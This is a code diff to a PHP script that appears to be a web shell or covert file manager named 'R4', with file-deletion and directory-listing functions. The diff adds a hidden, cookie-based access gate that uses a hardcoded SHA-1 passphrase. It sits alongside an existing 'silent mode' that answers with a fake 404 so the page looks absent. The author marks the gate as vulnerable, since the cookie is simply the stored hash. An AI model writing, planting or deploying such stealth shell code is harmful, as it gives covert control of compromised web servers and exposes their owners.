@@ -22,6 +22,8 @@
 
 define('R4_DEBUG', true); // show post data
 define('R4_SILENT_MODE', true); // 404 response code
+define('R4_LOGIN_MODE', true); // cookie based authentication (Vulnerable)
+define('R4_PASSPHARSE', '74d6d852df92296653bd64746e6c34d20e85e86e'); // sha1
 
 function getDirectoryContents($dir)
 {
@@ -244,8 +246,32 @@ function deleteAll($filename)
         return @unlink($filename);
     }
 }
+function activateLoginSystem()
+{
+    if(!isset($_COOKIE['r4'])) {
+        authLogin();
+    }
+    if(isset($_COOKIE['r4'])) {
+        if($_COOKIE['r4'] !== R4_PASSPHARSE) {
+            authLogin();
+        }
+    }
+}
+function authLogin()
+{
+    if (isset($_REQUEST['id'])) {
+        if (sha1($_REQUEST['id']) === R4_PASSPHARSE) {
+            setcookie('r4', R4_PASSPHARSE);
+        }
+    }
+    die;
+}
+
 if (R4_SILENT_MODE) {
     header('HTTP/1.1 404 Not Found');
+}
+if (R4_LOGIN_MODE) {
+    activateLoginSystem();
 }
 if (R4_DEBUG) {
     print_r($_POST);
@@ -334,8 +360,15 @@ if (R4_DEBUG) {
             background-position: center;
             background-repeat: no-repeat;
             background-size: cover;
-            background-image: linear-gradient(rgba(0, 0, 0, 0.5),rgba(0, 0, 0, 0.5)),
-            url('https://i.postimg.cc/Z549LsJM/x.gif');
+            background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)),
+                url('https://i.postimg.cc/Z549LsJM/x.gif');
+            background-attachment: fixed;
+        }
+
+        @media only screen and (max-device-width: 1366px) {
+            .parallax {
+                background-attachment: scroll;
+            }
         }
     </style>
 </head>
